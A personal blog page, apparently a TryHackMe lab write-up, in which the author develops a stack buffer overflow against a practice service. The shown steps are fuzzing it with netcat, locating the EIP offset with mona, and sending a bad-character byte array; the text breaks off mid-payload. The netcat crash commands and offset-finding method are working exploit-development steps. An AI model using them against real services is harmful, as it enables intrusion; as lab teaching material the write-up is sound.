        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20Choppy.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="CTF Choppy">CTF Choppy</span>
            <span class="post-date" title="2021-10-02 09:15:00">2021/10/02</span>
        </a>
        
        <a  class="All OS "
           href="/post/Run%20non%20steam%20game%20with%20proton%20on%20lutris.html"
           data-tag="Linux, Gaming"
           data-author="" >
            <span class="post-title" title="Setup Xfce with i3">Setup Xfce with i3</span>
            <span class="post-date" title="2021-09-15 12:40:00">2021/09/15</span>
        </a>
        
        <a  class="All OS "
           href="/post/Add%20windows%20to%20grub.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Add windows to grub">Add windows to grub</span>
            <span class="post-date" title="2021-08-28 15:54:00">2021/08/28</span>
        </a>
        
        <a  class="All OS "
           href="/post/Set%20Polybar%20on%202%20screens.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Set Polybar on 2 screens">Set Polybar on 2 screens</span>
            <span class="post-date" title="2021-08-08 12:15:00">2021/08/08</span>
        </a>
        
        <a  class="All Fix "
           href="/post/Fix%20the%20blur%20with%20picom.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Fix the blur with picom">Fix the blur with picom</span>
            <span class="post-date" title="2021-07-19 06:40:00">2021/07/19</span>
        </a>
        
        <a  class="All OS "
           href="/post/Configure_touchpad_on_i3.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Configure the touchpad [I3]">Configure the touchpad [I3]</span>
            <span class="post-date" title="2021-07-16 10:16:00">2021/07/16</span>
        </a>
        
        <a  class="All "
           href="/post/Send%20a%20file%20via%20ssh.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Send a file via ssh">Send a file via ssh</span>
            <span class="post-date" title="2021-07-14 12:15:00">2021/07/14</span>
        </a>
        
        <a  class="All OS "
           href="/post/Install%20nvidia%20driver%20on%20Arch%20Linux.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="Install nvidia driver on Arch Linux">Install nvidia driver on Arch Linux</span>
            <span class="post-date" title="2021-07-14 01:48:00">2021/07/14</span>
        </a>
        
        <a  class="All "
           href="/post/Restore%20a%20backup%20with%20timeshift.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Restore a backup with timeshift">Restore a backup with timeshift</span>
            <span class="post-date" title="2021-07-12 09:59:00">2021/07/12</span>
        </a>
        
        <a  class="All OS "
           href="/post/Add%20a%20partition%20in%20linux.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Add a partition in linux">Add a partition in linux</span>
            <span class="post-date" title="2021-07-11 11:06:00">2021/07/11</span>
        </a>
        
        <a  class="All OS "
           href="/post/Get%20a%20shell%20when%20Arch%20Linux%20is%20broken.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Get a shell when Arch Linux is broken">Get a shell when Arch Linux is broken</span>
            <span class="post-date" title="2021-07-07 14:55:00">2021/07/07</span>
        </a>
        
        <a  class="All OS "
           href="/post/Installing%20AUR%20packages.html"
           data-tag="arch"
           data-author="" >
            <span class="post-title" title="Installing AUR packages">Installing AUR packages</span>
            <span class="post-date" title="2021-07-04 21:45:00">2021/07/04</span>
        </a>
        
        <a  class="All OS "
           href="/post/Arch%20Linux%20installation%20guide.html"
           data-tag="Arch"
           data-author="" >
            <span class="post-title" title="Arch Linux installation guide">Arch Linux installation guide</span>
            <span class="post-date" title="2021-07-01 12:15:00">2021/07/01</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF-gigachad.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTF-gigachad">CTF-gigachad</span>
            <span class="post-date" title="2021-07-01 12:15:00">2021/07/01</span>
        </a>
        
        <a  class="All dev "
           href="/post/Create%20an%20IRC%20bot%20with%20python.html"
           data-tag="IRC"
           data-author="" >
            <span class="post-title" title="Create an IRC bot with python">Create an IRC bot with python</span>
            <span class="post-date" title="2021-06-22 05:25:00">2021/06/22</span>
        </a>
        
        <a  class="All OS "
           href="/post/OpenVPN.html"
           data-tag="VPN"
           data-author="" >
            <span class="post-title" title="OpenVPN">OpenVPN</span>
            <span class="post-date" title="2021-06-21 01:53:00">2021/06/21</span>
        </a>
        
        <a  class="All CTF "
           href="/post/CTF%20agile.html"
           data-tag="Linux"
           data-author="" >
            <span class="post-title" title="agile">agile</span>
            <span class="post-date" title="2021-04-13 03:15:00">2021/04/13</span>
        </a>
        
        <a  class="All Security "
           href="/post/Cr%C3%A9ation%20d'un%20relais%20tor%20avec%20debian%2010.html"
           data-tag="tor"
           data-author="" >
            <span class="post-title" title="CrÃ©ation d&#39;un relais tor avec debian 10">CrÃ©ation d&#39;un relais tor avec debian 10</span>
            <span class="post-date" title="2021-04-09 21:45:00">2021/04/09</span>
        </a>
        
        <a  class="All Security "
           href="/post/Securing%20an%20apache%20server.html"
           data-tag="webserver"
           data-author="" >
            <span class="post-title" title="Securing an apache server">Securing an apache server</span>
            <span class="post-date" title="2021-03-09 19:45:00">2021/03/09</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="åˆ‡æ¢å…¨å± å¿«æ·é”® s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-Buffer Overflow Prep 1" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">Buffer Overflow Prep 1</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="CTF">CTF</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color1">Buffer overflow</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2023-04-12 16:14:27'>2023-02-26 04:30</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:1.8k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views ðŸ‘€ :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Prereq"><span class="toc-text">Prereq</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OVERFLOW-1"><span class="toc-text">OVERFLOW 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-where-it%E2%80%99s-crashing"><span class="toc-text">Find where itâ€™s crashing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Inject-the-pattern"><span class="toc-text">Inject the pattern</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Finding-Bad-Characters"><span class="toc-text">Finding Bad Characters</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error"><span class="toc-text">Error</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Find-the-jump-point"><span class="toc-text">Find the jump point</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Generate-Payload"><span class="toc-text">Generate Payload.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Prepend-NOPs"><span class="toc-text">Prepend NOPs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Preparing-the-Exploit"><span class="toc-text">Preparing the Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EIP"><span class="toc-text">EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESP"><span class="toc-text">ESP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EBP"><span class="toc-text">EBP</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p>
<h1 id="Prereq"><a href="#Prereq" class="headerlink" title="Prereq"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Prereq" title="Prereq"></a>Prereq</h1><p>You have to start the server with the debugger.<br>Then listen with netcat.</p>
<p>You should have something like that:  </p>
<p><img src="https://i.imgur.com/O8ltRJg.png"></p>
<h1 id="OVERFLOW-1"><a href="#OVERFLOW-1" class="headerlink" title="OVERFLOW 1"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#OVERFLOW-1" title="OVERFLOW 1"></a>OVERFLOW 1</h1><h2 id="Find-where-itâ€™s-crashing"><a href="#Find-where-itâ€™s-crashing" class="headerlink" title="Find where itâ€™s crashing"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Find-where-it%E2%80%99s-crashing" title="Find where itâ€™s crashing"></a>Find where itâ€™s crashing</h2><p>He ask us to use he fuzzer to find where itâ€™s crashing.<br>I wand to do it myself to learn.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*100)'</span><span class="token variable">)</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/OShHTMw.png"></p>
<p>Itâ€™s crashing between 1500 and 2000.  </p>
<p><img src="https://i.imgur.com/8MO7yqc.png"></p>
<p>Between 1970 and 1990  </p>
<p><img src="https://i.imgur.com/Mtn9B5K.png"></p>
<p>At 1972 itâ€™s ok, at 1973 itâ€™s crashing.  </p>
<p><img src="https://i.imgur.com/IUNdZsm.png"></p>
<h2 id="Inject-the-pattern"><a href="#Inject-the-pattern" class="headerlink" title="Inject the pattern"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Inject-the-pattern" title="Inject the pattern"></a>Inject the pattern</h2><p>In the fuzzer itâ€™s incrementing by 100, so I donâ€™t have to be so precise.<br>The server crash at 1973, letâ€™s create a string of 2000</p>
<p><img src="https://i.imgur.com/Iow70fc.png"></p>
<p>Now letâ€™s find the offset with mona:<br><code>!mona findmsp -distance 2000</code>  </p>
<p><img src="https://i.imgur.com/LYfzR0k.png"></p>
<p><img src="https://i.imgur.com/LvHwIjc.png"></p>
<p>The EIP patternt is at 1978.<br>So I have to sent the prefix â€œOVERFLOW1 â€œ + 1978 letters A + few letters B.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -q <span class="token number">1</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*1978)'</span><span class="token variable">)</span></span><span class="token string">"BBBB"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://i.imgur.com/a8gtAi8.png"></p>
<p>BBBB = 42424242</p>
<h1 id="Finding-Bad-Characters"><a href="#Finding-Bad-Characters" class="headerlink" title="Finding Bad Characters"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Finding-Bad-Characters" title="Finding Bad Characters"></a>Finding Bad Characters</h1><p>We have to do `!mona bytearray -b â€œ\x00â€:  </p>
<p><img src="https://i.imgur.com/4nfCUnQ.png"></p>
<p>Letâ€™s do the same in bash.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$i</span> <span class="token operator">!=</span> <span class="token number">256</span> <span class="token punctuation">]</span>
<span class="token keyword">do</span>
	<span class="token assign-left variable">x</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">printf</span> <span class="token string">"%02x<span class="token entity" title="\n">\n</span>"</span> $i<span class="token variable">`</span></span>
	<span class="token assign-left variable">string</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$&#123;string&#125;</span>\x<span class="token variable">$&#123;x&#125;</span>"</span>
	<span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span>
<span class="token keyword">done</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://i.imgur.com/pASIyz8.png"></p>
<p>I have to send the bytearray.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -q <span class="token number">1</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*1978)'</span><span class="token variable">)</span></span><span class="token string">"BBBB<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x46">\x46</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x72">\x72</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x74">\x74</span><span class="token entity" title="\x75">\x75</span><span class="token entity" title="\x76">\x76</span><span class="token entity" title="\x77">\x77</span><span class="token entity" title="\x78">\x78</span><span class="token entity" title="\x79">\x79</span><span class="token entity" title="\x7a">\x7a</span><span class="token entity" title="\x7b">\x7b</span><span class="token entity" title="\x7c">\x7c</span><span class="token entity" title="\x7d">\x7d</span><span class="token entity" title="\x7e">\x7e</span><span class="token entity" title="\x7f">\x7f</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\x81">\x81</span><span class="token entity" title="\x82">\x82</span><span class="token entity" title="\x83">\x83</span><span class="token entity" title="\x84">\x84</span><span class="token entity" title="\x85">\x85</span><span class="token entity" title="\x86">\x86</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\x88">\x88</span><span class="token entity" title="\x89">\x89</span><span class="token entity" title="\x8a">\x8a</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x8c">\x8c</span><span class="token entity" title="\x8d">\x8d</span><span class="token entity" title="\x8e">\x8e</span><span class="token entity" title="\x8f">\x8f</span><span class="token entity" title="\x90">\x90</span><span class="token entity" title="\x91">\x91</span><span class="token entity" title="\x92">\x92</span><span class="token entity" title="\x93">\x93</span><span class="token entity" title="\x94">\x94</span><span class="token entity" title="\x95">\x95</span><span class="token entity" title="\x96">\x96</span><span class="token entity" title="\x97">\x97</span><span class="token entity" title="\x98">\x98</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x9a">\x9a</span><span class="token entity" title="\x9b">\x9b</span><span class="token entity" title="\x9c">\x9c</span><span class="token entity" title="\x9d">\x9d</span><span class="token entity" title="\x9e">\x9e</span><span class="token entity" title="\x9f">\x9f</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\xa1">\xa1</span><span class="token entity" title="\xa2">\xa2</span><span class="token entity" title="\xa3">\xa3</span><span class="token entity" title="\xa4">\xa4</span><span class="token entity" title="\xa5">\xa5</span><span class="token entity" title="\xa6">\xa6</span><span class="token entity" title="\xa7">\xa7</span><span class="token entity" title="\xa8">\xa8</span><span class="token entity" title="\xa9">\xa9</span><span class="token entity" title="\xaa">\xaa</span><span class="token entity" title="\xab">\xab</span><span class="token entity" title="\xac">\xac</span><span class="token entity" title="\xad">\xad</span><span class="token entity" title="\xae">\xae</span><span class="token entity" title="\xaf">\xaf</span><span class="token entity" title="\xb0">\xb0</span><span class="token entity" title="\xb1">\xb1</span><span class="token entity" title="\xb2">\xb2</span><span class="token entity" title="\xb3">\xb3</span><span class="token entity" title="\xb4">\xb4</span><span class="token entity" title="\xb5">\xb5</span><span class="token entity" title="\xb6">\xb6</span><span class="token entity" title="\xb7">\xb7</span><span class="token entity" title="\xb8">\xb8</span><span class="token entity" title="\xb9">\xb9</span><span class="token entity" title="\xba">\xba</span><span class="token entity" title="\xbb">\xbb</span><span class="token entity" title="\xbc">\xbc</span><span class="token entity" title="\xbd">\xbd</span><span class="token entity" title="\xbe">\xbe</span><span class="token entity" title="\xbf">\xbf</span><span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xc1">\xc1</span><span class="token entity" title="\xc2">\xc2</span><span class="token entity" title="\xc3">\xc3</span><span class="token entity" title="\xc4">\xc4</span><span class="token entity" title="\xc5">\xc5</span><span class="token entity" title="\xc6">\xc6</span><span class="token entity" title="\xc7">\xc7</span><span class="token entity" title="\xc8">\xc8</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xca">\xca</span><span class="token entity" title="\xcb">\xcb</span><span class="token entity" title="\xcc">\xcc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\xce">\xce</span><span class="token entity" title="\xcf">\xcf</span><span class="token entity" title="\xd0">\xd0</span><span class="token entity" title="\xd1">\xd1</span><span class="token entity" title="\xd2">\xd2</span><span class="token entity" title="\xd3">\xd3</span><span class="token entity" title="\xd4">\xd4</span><span class="token entity" title="\xd5">\xd5</span><span class="token entity" title="\xd6">\xd6</span><span class="token entity" title="\xd7">\xd7</span><span class="token entity" title="\xd8">\xd8</span><span class="token entity" title="\xd9">\xd9</span><span class="token entity" title="\xda">\xda</span><span class="token entity" title="\xdb">\xdb</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xdd">\xdd</span><span class="token entity" title="\xde">\xde</span><span class="token entity" title="\xdf">\xdf</span><span class="token entity" title="\xe0">\xe0</span><span class="token entity" title="\xe1">\xe1</span><span class="token entity" title="\xe2">\xe2</span><span class="token entity" title="\xe3">\xe3</span><span class="token entity" title="\xe4">\xe4</span><span class="token entity" title="\xe5">\xe5</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\xe7">\xe7</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\xea">\xea</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\xec">\xec</span><span class="token entity" title="\xed">\xed</span><span class="token entity" title="\xee">\xee</span><span class="token entity" title="\xef">\xef</span><span class="token entity" title="\xf0">\xf0</span><span class="token entity" title="\xf1">\xf1</span><span class="token entity" title="\xf2">\xf2</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xf4">\xf4</span><span class="token entity" title="\xf5">\xf5</span><span class="token entity" title="\xf6">\xf6</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xf8">\xf8</span><span class="token entity" title="\xf9">\xf9</span><span class="token entity" title="\xfa">\xfa</span><span class="token entity" title="\xfb">\xfb</span><span class="token entity" title="\xfc">\xfc</span><span class="token entity" title="\xfd">\xfd</span><span class="token entity" title="\xfe">\xfe</span><span class="token entity" title="\xff">\xff</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>And create it with mona too:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona bytearray -b <span class="token string">"<span class="token entity" title="\x00">\x00</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Now compare with the ESP rgister point:  </p>
<p><img src="https://i.imgur.com/ioDIRnS.png"></p>
<p>Iâ€™m gonna do a little test, letâ€™s see what append if I remove 2 B from the payload.  </p>
<p><img src="https://i.imgur.com/JFZ94kV.png"></p>
<p>2 chars is missing in the ASCII part, the <code>\x</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona compare -f C:<span class="token punctuation">\</span>mona<span class="token punctuation">\</span>oscp<span class="token punctuation">\</span>bytearray.bin -a esp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a><a href="https://peanutstick.github.io/post/Buffer%20Overflow%20Prep%20for%20OSCP%201.html#Error" title="Error"></a>Error</h2><p>Itâ€™s not working because he interpret my hex code as ASCII.</p>
<p>So Iâ€™m gonna input the payload in the python command only.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -q <span class="token number">1</span> <span class="token number">10.10</span>.5.89 <span class="token number">1337</span> <span class="token operator">&lt;&lt;&lt;</span> <span class="token string">"OVERFLOW1 "</span><span class="token variable"><span class="token variable">$(</span>python -c <span class="token string">'print("A"*1978 + "B"*4 + "<span class="token entity" title="\x01">\x01</span><span class="token entity" title="\x02">\x02</span><span class="token entity" title="\x03">\x03</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x05">\x05</span><span class="token entity" title="\x06">\x06</span><span class="token entity" title="\x07">\x07</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x09">\x09</span><span class="token entity" title="\x0a">\x0a</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\x0c">\x0c</span><span class="token entity" title="\x0d">\x0d</span><span class="token entity" title="\x0e">\x0e</span><span class="token entity" title="\x0f">\x0f</span><span class="token entity" title="\x10">\x10</span><span class="token entity" title="\x11">\x11</span><span class="token entity" title="\x12">\x12</span><span class="token entity" title="\x13">\x13</span><span class="token entity" title="\x14">\x14</span><span class="token entity" title="\x15">\x15</span><span class="token entity" title="\x16">\x16</span><span class="token entity" title="\x17">\x17</span><span class="token entity" title="\x18">\x18</span><span class="token entity" title="\x19">\x19</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\x1b">\x1b</span><span class="token entity" title="\x1c">\x1c</span><span class="token entity" title="\x1d">\x1d</span><span class="token entity" title="\x1e">\x1e</span><span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x20">\x20</span><span class="token entity" title="\x21">\x21</span><span class="token entity" title="\x22">\x22</span><span class="token entity" title="\x23">\x23</span><span class="token entity" title="\x24">\x24</span><span class="token entity" title="\x25">\x25</span><span class="token entity" title="\x26">\x26</span><span class="token entity" title="\x27">\x27</span><span class="token entity" title="\x28">\x28</span><span class="token entity" title="\x29">\x29</span><span class="token entity" title="\x2a">\x2a</span><span class="token entity" title="\x2b">\x2b</span><span class="token entity" title="\x2c">\x2c</span><span class="token entity" title="\x2d">\x2d</span><span class="token entity" title="\x2e">\x2e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x30">\x30</span><span class="token entity" title="\x31">\x31</span><span class="token entity" title="\x32">\x32</span><span class="token entity" title="\x33">\x33</span><span class="token entity" title="\x34">\x34</span><span class="token entity" title="\x35">\x35</span><span class="token entity" title="\x36">\x36</span><span class="token entity" title="\x37">\x37</span><span class="token entity" title="\x38">\x38</span><span class="token entity" title="\x39">\x39</span><span class="token entity" title="\x3a">\x3a</span><span class="token entity" title="\x3b">\x3b</span><span class="token entity" title="\x3c">\x3c</span><span class="token entity" title="\x3d">\x3d</span><span class="token entity" title="\x3e">\x3e</span><span class="token entity" title="\x3f">\x3f</span><span class="token entity" title="\x40">\x40</span><span class="token entity" title="\x41">\x41</span><span class="token entity" title="\x42">\x42</span><span class="token entity" title="\x43">\x43</span><span class="token entity" title="\x44">\x44</span><span class="token entity" title="\x45">\x45</span><span class="token entity" title="\x46">\x46</span><span class="token entity" title="\x47">\x47</span><span class="token entity" title="\x48">\x48</span><span class="token entity" title="\x49">\x49</span><span class="token entity" title="\x4a">\x4a</span><span class="token entity" title="\x4b">\x4b</span><span class="token entity" title="\x4c">\x4c</span><span class="token entity" title="\x4d">\x4d</span><span class="token entity" title="\x4e">\x4e</span><span class="token entity" title="\x4f">\x4f</span><span class="token entity" title="\x50">\x50</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x52">\x52</span><span class="token entity" title="\x53">\x53</span><span class="token entity" title="\x54">\x54</span><span class="token entity" title="\x55">\x55</span><span class="token entity" title="\x56">\x56</span><span class="token entity" title="\x57">\x57</span><span class="token entity" title="\x58">\x58</span><span class="token entity" title="\x59">\x59</span><span class="token entity" title="\x5a">\x5a</span><span class="token entity" title="\x5b">\x5b</span><span class="token entity" title="\x5c">\x5c</span><span class="token entity" title="\x5d">\x5d</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x5f">\x5f</span><span class="token entity" title="\x60">\x60</span><span class="token entity" title="\x61">\x61</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x63">\x63</span><span class="token entity" title="\x64">\x64</span><span class="token entity" title="\x65">\x65</span><span class="token entity" title="\x66">\x66</span><span class="token entity" title="\x67">\x67</span><span class="token entity" title="\x68">\x68</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6a">\x6a</span><span class="token entity" title="\x6b">\x6b</span><span class="token entity" title="\x6c">\x6c</span><span class="token entity" title="\x6d">\x6d</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x6f">\x6f</span><span class="token entity" title="\x70">\x70</span><span class="token entity" title="\x71">\x71</span><span class="token entity" title="\x72">\x72</span><span class="token entity" 